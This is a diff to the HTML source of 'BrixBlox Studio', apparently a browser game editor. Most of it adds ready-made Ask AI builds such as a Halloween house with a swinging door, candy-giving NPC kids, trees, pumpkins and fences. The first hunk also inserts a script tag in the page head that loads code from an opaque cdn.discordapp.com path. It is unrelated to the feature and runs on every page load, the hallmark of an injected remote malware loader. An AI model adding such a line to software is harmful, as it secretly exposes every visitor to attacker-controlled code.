@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en" data-theme="light">
-<head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/Ke-AcOrbzZ0510xgwyqEf6dlZGYuX0XPAXwWtgcuVI061zuvLd6pCfpwlnPmM4lYf3rBGGRg8eZCX-ptPjnwTQKVisogHP1eAhVietHWPituV6sFYVqDLxIDfR4crXFBBCM2T3LdmGeMQVKXE1Xec0BzAGmxk0WGGx_5_HxIBB3UpsZd1fpx7a7uOnKgLk-fgE4BVSXpvd91uGy_auGZ2GXGcGPLz3nW7rF7WVPgv4vwwXdEBEpxThxuwiZ8KR5RcwtPrD8g6hft3WVSQsfqTw_4u6wotndVA_zzOkOvxRVCHW6ogLoD95Z4duP0s1recFR0rvMZeCWpgj4x2cRzigG9TLxI0GsU712SgqBTR3E4szIYEFPJTzi6Y4Rbo6dV8ZddIOi38Kr8iZPJ74A6MITuf_I6eMaSkJ8iTjlulQQOKlQQgYJ2wIc7-5P4X_ubiGkEImoKrN5XSIu0v_nmFo2d7QzccqO8oxxMkpQ_lIqLw5dl0Yla4N0z2-Oi6Nil_lPBUXI4GTMxDdp9MNM7Mz6oMzymWs3eCeZXaWoi9vpzShhCi0zhkklRefLO8Y0lK16CnHprusD-MuLWgl-guyo6tDKUakBShx56spDzfchRI28S9WcDLH_Np5sbURRdz1A35FJpim-dXK6TvAyQWzsXDUE1VcVTFxqD'></script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>BrixBlox Studio</title>
@@ -3063,15 +3063,97 @@ function aiFacts(){const f=[];try{f.push('Materials: '+Object.keys(MATS).join(',
   try{const v=(P.vars||[]).map(function(x){return typeof x==='string'?x:x&&x.name}).filter(Boolean);if(v.length)f.push('Variables that exist: '+v.slice(0,40).join(', '))}catch(x){}return f.join('\n')}
 function aiParse(t){t=String(t||'').replace(/^\s*```(?:json)?/i,'').replace(/```\s*$/,'').trim();let o=null;
   try{o=JSON.parse(t)}catch(x){const a=t.indexOf('{'),b=t.lastIndexOf('}');if(a>=0&&b>a){try{o=JSON.parse(t.slice(a,b+1))}catch(y){}}}
-  if(o&&!Array.isArray(o.scripts)&&(Array.isArray(o.guis)||Array.isArray(o.parts)))o.scripts=[];
+  if(o&&!Array.isArray(o.scripts)&&(Array.isArray(o.guis)||Array.isArray(o.parts)||Array.isArray(o.kits)))o.scripts=[];
   if(!o||!Array.isArray(o.scripts))throw new Error('The AI answered in a way Studio could not read. Try asking again.');return o}
 function aiOwner(){if(selScr&&selScr.o)return selScr.o;if(selGui)return selGui;const p=sel.length?byId(sel[0]):null;return p?(p.model||p.id):null}
 function aiNum(v,lo,hi,d){v=parseFloat(v);return isFinite(v)?Math.min(hi,Math.max(lo,v)):d}
 /* Where new parts go: in front of the camera (or on the surface it looks at). Parts from the AI are positioned relative to this point. */
 function aiOrigin(){try{const f=fwd(),o=new THREE.Vector3(cam.x,cam.y,cam.z);ray.set(o,new THREE.Vector3(f[0],f[1],f[2]));const h=ray.intersectObjects(pickable(),false)[0];
   const r=(h&&h.distance<60)?[h.point.x,h.point.y,h.point.z]:[o.x+f[0]*12,0,o.z+f[2]*12];return r.map(function(v){return Math.round(v*2)/2})}catch(e){return [0,0,0]}}
+/* ===== Ready-made builds for Ask AI. The AI places these by name (house, tree, lamp...) and Studio builds them properly:
+   a house has walls with a real doorway, a hinged door that swings open when you touch it, and a kid rig that waves and talks. ===== */
+const AI_KITS=['house','npc','tree','pumpkin','lamp','fence','grave','ground','path'];
+const AI_KID_SAY=['Trick or treat! Here, take some candy!','Happy Halloween! Have a treat!','Ooh, great costume! Candy for you!','Boo! Just kidding. Take a treat!','You found me! Here is your candy!'];
+const AI_KID_LOOK=[['#ff7a00','#2b2b3a','#f0c49a','#1b1b1b'],['#7a3fd1','#2b2b3a','#e8b98a','#3a1a5a'],['#2fa84f','#3a2b1a','#f0c49a',''],['#d12f4f','#1f3a5a','#d9a77a','#1b1b1b'],['#e8e8e8','#e8e8e8','#f0c49a','']];
+function aiRotXZ(dx,dz,rot){const a=rot*Math.PI/180,c=Math.round(Math.cos(a)*1e6)/1e6,s=Math.round(Math.sin(a)*1e6)/1e6;return [dx*c+dz*s,-dx*s+dz*c]}
+function aiNameModel(mid,base){const m=P.models.find(function(z){return z.id===mid});if(!m)return base;let n=1,nm=base;while(P.models.some(function(z){return z!==m&&z.name===nm}))nm=base+(++n);m.name=nm;return nm}
+function aiWave(arm){const A=P.anims.wave||(P.anims.wave={len:1.2,keys:{},type:'other'});A.len=Math.max(A.len||1,1.2);if(!A.keys)A.keys={};
+  A.keys[arm.id]=[{t:0,r:[0,0,0]},{t:.3,r:[160,0,0]},{t:.6,r:[125,0,0]},{t:.9,r:[160,0,0]},{t:1.2,r:[0,0,0]}]}
+/* A block character (same as Shift+N then R) with a costume, standing with its feet at height fy. Returns {st,name}. */
+function aiNpc(c,res,pend){
+  const look=AI_KID_LOOK[(P.nid+(c.look||0))%AI_KID_LOOK.length],col=function(v,d){return cssHex(v)||d};
+  const ST=mkPart('Stabilizer',[c.x,c.fy+3,c.z],[.6,.6,.6],'#9aa4ae');ST.stab=true;blockBody(ST,true);
+  const ps=rigParts(ST),by=function(n){return ps.find(function(q){return q.name===n})};
+  const shirt=col(c.shirt,look[0]),pants=col(c.pants,look[1]),skin=col(c.skin,look[2]),hat=col(c.hat,look[3]||'');
+  [['Torso',shirt],['Head',skin],['Rarm',skin],['Larm',skin],['Rleg',pants],['Lleg',pants]].forEach(function(r){const q=by(r[0]);if(q)q.color=r[1]});
+  const hd=by('Head');
+  if(hat&&hd){const hx=ST.pos[0],hy=ST.pos[1]+1.65;
+    const br=mkPart('Hat Brim',[hx,hy+.85,ST.pos[2]],[1.9,.2,1.9],hat),tp=mkPart('Hat Top',[hx,hy+1.45,ST.pos[2]],[1.2,1,1.2],hat);
+    [br,tp].forEach(function(q){q.parent=hd.id;q.pivot=defPivot(q);q.sm=true})}
+  const mid=ensureRigModel(ST);cleanModels();snapRig(ST);const nm=aiNameModel(mid,String(c.name||'Kid').slice(0,20));
+  if(c.rot)ST.rot=[0,c.rot,0];
+  const arm=by('Rarm');if(arm)aiWave(arm);
+  res.parts+=ps.length;if(c.scripts)pend.push([c.scripts,ST.id]);
+  return {st:ST,name:nm}}
+function aiKit(k,org,res,pend,ren){
+  const type=String(k&&(k.kit||k.type)||'').toLowerCase();if(AI_KITS.indexOf(type)<0){res.dropped++;return}
+  const rot=(((Math.round((parseFloat(k.rot)||0)/90)*90)%360)+360)%360,cx=org[0]+aiNum(k.x,-300,300,0),cz=org[2]+aiNum(k.z,-300,300,0),gy=org[1];
+  const nm=String(k.name||type).trim().slice(0,20)||type,col=function(v,d){return cssHex(v)||d};
+  /* one piece: dx,dz are measured from the kit's centre and turn with rot; dy is the height of the piece's centre above the floor; w,d swap for sideways kits */
+  const mp=function(n,dx,dy,dz,w,h,d,color,o){o=o||{};const sw=(rot%180)?[d,h,w]:[w,h,d],r=aiRotXZ(dx,dz,rot);
+    const q=mkPart(n,[Math.round((cx+r[0])*100)/100,Math.round((gy+dy)*100)/100,Math.round((cz+r[1])*100)/100],sw,color);
+    if(o.shape)q.shape=o.shape;if(o.mat&&MATS[o.mat]&&o.mat!=='plastic')q.mat=o.mat;if(o.nocol)q.nocol=true;res.parts++;return q};
+  if(type==='house'){
+    const w=aiNum(k.w,8,24,12),d=aiNum(k.d,8,20,10),h=aiNum(k.h,5,14,7),dw=3.6,dh=5.4,pw=(w-dw)/2;
+    const wall=col(k.wall,'#d9c7a3'),roof=col(k.roof,'#7a2e2e'),dc=col(k.door,'#5a3a1e'),zf=d/2-.5;
+    mp(nm+' Floor',0,.15,0,w,.3,d,'#6b4a2f',{mat:'wood'});
+    mp(nm+' Back Wall',0,h/2,-d/2+.5,w,h,1,wall,{mat:'brick'});
+    mp(nm+' Left Wall',-w/2+.5,h/2,0,1,h,d-2,wall,{mat:'brick'});mp(nm+' Right Wall',w/2-.5,h/2,0,1,h,d-2,wall,{mat:'brick'});
+    mp(nm+' Front Left',-(dw/2+pw/2),h/2,zf,pw,h,1,wall,{mat:'brick'});mp(nm+' Front Right',dw/2+pw/2,h/2,zf,pw,h,1,wall,{mat:'brick'});
+    mp(nm+' Door Top',0,dh+(h-dh)/2,zf,dw,h-dh,1,wall,{mat:'brick'});
+    mp(nm+' Roof',0,h+.5,0,w+2,1,d+2,roof);mp(nm+' Roof Top',0,h+1.5,0,w-2,1,d-2,roof);mp(nm+' Chimney',w/3,h+2.6,-d/4,1.6,3,1.6,'#555555',{mat:'brick'});
+    mp(nm+' Window L',-w/2-.05,4,0,.2,2,2.4,'#ffd35a',{mat:'neon',nocol:true});mp(nm+' Window R',w/2+.05,4,0,.2,2,2.4,'#ffd35a',{mat:'neon',nocol:true});
+    if(pw>=3.2){const wx=dw/2+pw/2;mp(nm+' Window FL',-wx,4,d/2+.02,2.2,2,.2,'#ffd35a',{mat:'neon',nocol:true});mp(nm+' Window FR',wx,4,d/2+.02,2.2,2,.2,'#ffd35a',{mat:'neon',nocol:true})}
+    mp(nm+' Step',0,.15,d/2+1,dw+1.5,.3,2,'#888888');
+    mp(nm+' Pumpkin',dw/2+1.6,.8,d/2+1.3,1.6,1.4,1.6,'#ff7a00',{shape:'sphere'});
+    /* the door: a hinge post with the panel and knob welded to it, so turning the post swings the whole door around the hinge */
+    const hx=-dw/2+.2,hinge=mp(nm+' Door',hx,dh/2,zf,.4,dh,.5,dc,{mat:'wood'}),panel=mp(nm+' Door Panel',.2,dh/2,zf,dw-.4,dh,.5,dc,{mat:'wood'}),knob=mp(nm+' Knob',dw/2-.6,dh/2-.2,zf+.35,.5,.5,.5,'#ffcc33',{shape:'sphere'});
+    hinge.pivot=defPivot(hinge);[panel,knob].forEach(function(q){q.parent=hinge.id;q.pivot=defPivot(q)});
+    const dm=ensureRigModel(hinge);cleanModels();snapRig(hinge);aiNameModel(dm,nm+' Door');
+    /* a kid waits just inside the doorway */
+    const kp=aiRotXZ(0,d/2-2.8,rot),kid=aiNpc({name:nm+' Kid',x:cx+kp[0],z:cz+kp[1],fy:gy+.3,rot:rot,look:k.look||0},res,pend);
+    const sid=P.nid++,vo='open'+sid,msg='treat'+sid,gn=ren&&ren.candycount?ren.candycount:'CandyCount',hasG=!!guiByName(gn)[0];
+    const open=[{t:'set',a:[vo,'1']},{t:'broadcast',a:[msg]},{t:'tweenturn',a:['0','-90','0','0.6','smooth']},{t:'change',a:['candy','1']}];
+    if(hasG)open.push({t:'guitext',a:[gn,'candy']});
+    open.push({t:'wait',a:['4']},{t:'tweenturn',a:['0','90','0','0.6','smooth']},{t:'wait',a:['1']},{t:'set',a:[vo,'0']});
+    pend.push([[[{t:'touched',a:[]},{t:'if',a:[vo+' < 1'],k:open}]],hinge.id]);
+    pend.push([[[{t:'start',a:[]},{t:'set',a:[vo,'0']},{t:'set',a:['candy','0']}]],null]);
+    pend.push([[[{t:'recv',a:[msg]},{t:'say',a:[AI_KID_SAY[sid%AI_KID_SAY.length]]},{t:'playanim',a:['wave']}]],kid.st.id]);
+  }else if(type==='npc'){
+    aiNpc({name:nm,x:cx,z:cz,fy:gy,rot:rot,shirt:k.shirt,pants:k.pants,skin:k.skin,hat:k.hat,scripts:Array.isArray(k.scripts)?k.scripts.slice(0,4):null,look:k.look||0},res,pend);
+  }else if(type==='tree'){
+    const s=aiNum(k.size,.5,3,1);
+    mp(nm+' Trunk',0,2.2*s,0,1.2*s,4.4*s,1.2*s,col(k.trunk,'#5a3a1e'),{shape:'cyl',mat:'wood'});
+    mp(nm+' Leaves',0,6*s,0,5*s,4.5*s,5*s,col(k.leaves,'#2f7d32'),{shape:'sphere',nocol:true});
+  }else if(type==='pumpkin'){
+    const s=aiNum(k.size,.5,4,1);
+    mp(nm,0,.8*s,0,2*s,1.6*s,2*s,col(k.color,'#ff7a00'),{shape:'sphere'});mp(nm+' Stem',0,1.7*s,0,.35*s,.5*s,.35*s,'#3a6b2a');
+  }else if(type==='lamp'){
+    mp(nm+' Post',0,4,0,.4,8,.4,'#2b2b2b',{shape:'cyl'});mp(nm+' Bulb',0,8.4,0,1.3,1.3,1.3,col(k.color,'#ffd35a'),{shape:'sphere',mat:'neon',nocol:true});
+  }else if(type==='fence'){
+    const L=aiNum(k.length,2,24,10),n=Math.min(13,Math.floor(L/2)+1);
+    for(let i=0;i<n;i++)mp(nm+' Post',-L/2+(n>1?i*L/(n-1):0),1.5,0,.4,3,.4,col(k.color,'#6b4a2f'),{mat:'wood'});
+    mp(nm+' Rail',0,1,0,L,.3,.25,col(k.color,'#6b4a2f'),{mat:'wood'});mp(nm+' Rail',0,2.2,0,L,.3,.25,col(k.color,'#6b4a2f'),{mat:'wood'});
+  }else if(type==='grave'){
+    mp(nm+' Base',0,.2,0,2.4,.4,1.2,'#6e6e6e');mp(nm+' Stone',0,1.5,0,1.8,2.6,.5,col(k.color,'#8a8a8a'));
+  }else if(type==='ground'){
+    mp(nm,0,-.2,0,aiNum(k.w,4,400,100),.5,aiNum(k.d,4,400,100),col(k.color,'#3f7d3a'));
+  }else if(type==='path'){
+    mp(nm,0,.1,0,aiNum(k.w,1,100,6),.1,aiNum(k.d,1,400,40),col(k.color,'#9a9a9a'),{nocol:true});
+  }
+  res.kits++}
 function aiBuild(o,attach){
-  const res={made:0,blocks:0,dropped:0,guis:0,parts:0},ren={},pend=[];
+  const res={made:0,blocks:0,dropped:0,guis:0,parts:0,kits:0},ren={},pend=[];
   const GD={text:{x:35,y:5,w:30,h:10,text:'Hello!',bg:'#000000',op:0,color:'#ffffff',fs:26,round:0},
     button:{x:40,y:80,w:20,h:9,text:'Click me',bg:'#00b06f',op:1,color:'#ffffff',fs:20,round:10},
     frame:{x:30,y:30,w:40,h:40,text:'',bg:'#232527',op:.85,color:'#ffffff',fs:20,round:8},
@@ -3086,7 +3168,7 @@ function aiBuild(o,attach){
       op:aiNum(x.op,0,1,D.op),fs:aiNum(x.fs,8,120,D.fs),round:aiNum(x.round,0,50,D.round)};
     P.guis.push(g);res.guis++;if(nm.toLowerCase()!==want.toLowerCase())ren[want.toLowerCase()]=nm;pend.push([x.scripts,g.id])});
   const SHP={box:'box',block:'box',cube:'box',ball:'sphere',sphere:'sphere',cyl:'cyl',cylinder:'cyl',wedge:'wedge',triangle:'wedge',ramp:'wedge'},org=aiOrigin();
-  (Array.isArray(o.parts)?o.parts:[]).slice(0,25).forEach(function(x){
+  (Array.isArray(o.parts)?o.parts:[]).slice(0,40).forEach(function(x){
     if(!x||typeof x!=='object'){res.dropped++;return}
     const sh=SHP[String(x.shape||'box').toLowerCase()]||'box',size=[aiNum(x.w,.2,300,4),aiNum(x.h,.2,300,1),aiNum(x.d,.2,300,4)];
     const pos=[org[0]+aiNum(x.x,-300,300,0),Math.max(.1,org[1]+aiNum(x.y,-50,300,size[1]/2)),org[2]+aiNum(x.z,-300,300,0)].map(function(v){return Math.round(v*100)/100});
@@ -3096,7 +3178,8 @@ function aiBuild(o,attach){
     const tr=aiNum(x.transparency,0,1,0);if(tr>0)q.tr=tr;
     if(x.solid===false)q.nocol=true;
     res.parts++;pend.push([x.scripts,q.id])});
-  if(res.guis||res.parts){try{all()}catch(e){}}
+  (Array.isArray(o.kits)?o.kits:[]).slice(0,40).forEach(function(k){try{aiKit(k,org,res,pend,ren)}catch(e){res.dropped++}});
+  if(res.guis||res.parts||res.kits){try{all()}catch(e){}}
   const add=function(list,owner,att){const r=aiInsert(list,att,owner,ren);res.made+=r.made;res.blocks+=r.blocks;res.dropped+=r.dropped};
   pend.forEach(function(q){if(Array.isArray(q[0])&&q[0].length)add(q[0].slice(0,4),q[1],false)});
   add(o.scripts||[],null,attach);
@@ -3144,7 +3227,7 @@ function aiUpsell(){const ov=el('div');ov.style.cssText='position:fixed;inset:0;
         if(r.status===403&&d&&d.code==='premium'){ME.prem=false;try{store.set('brixblox-me',JSON.stringify(ME))}catch(x){}busy=false;go.disabled=false;close();aiUpsell();return}
         if(!r.ok||!d||d.error)throw new Error(d&&d.error?d.error:r.status===404?'The AI server is not set up yet. Add functions/api/blocks.js and your Gemini key to your site first.':'The AI server had a problem (error '+r.status+').');
         const o=aiParse(d.text),res=aiBuild(o,at.checked&&!at.disabled);
-        const bits=[];if(res.guis)bits.push(res.guis+' GUI');if(res.parts)bits.push(res.parts+' part'+(res.parts>1?'s':''));if(res.made)bits.push(res.made+' script'+(res.made>1?'s':'')+' ('+res.blocks+' blocks)');
+        const bits=[];if(res.guis)bits.push(res.guis+' GUI');if(res.kits)bits.push(res.kits+' build'+(res.kits>1?'s':''));if(res.parts)bits.push(res.parts+' part'+(res.parts>1?'s':''));if(res.made)bits.push(res.made+' script'+(res.made>1?'s':'')+' ('+res.blocks+' blocks)');
         st.textContent=bits.length?'Added '+bits.join(', ')+(res.dropped?'. Skipped '+res.dropped+' thing'+(res.dropped>1?'s':'')+' that do not exist.':'.')+(o.note?' '+String(o.note).slice(0,200):''):(o.note?String(o.note).slice(0,240):'The AI could not make that. Try describing it differently.')}
       catch(e){st.textContent=String(e.message||e)}
       busy=false;go.disabled=false};
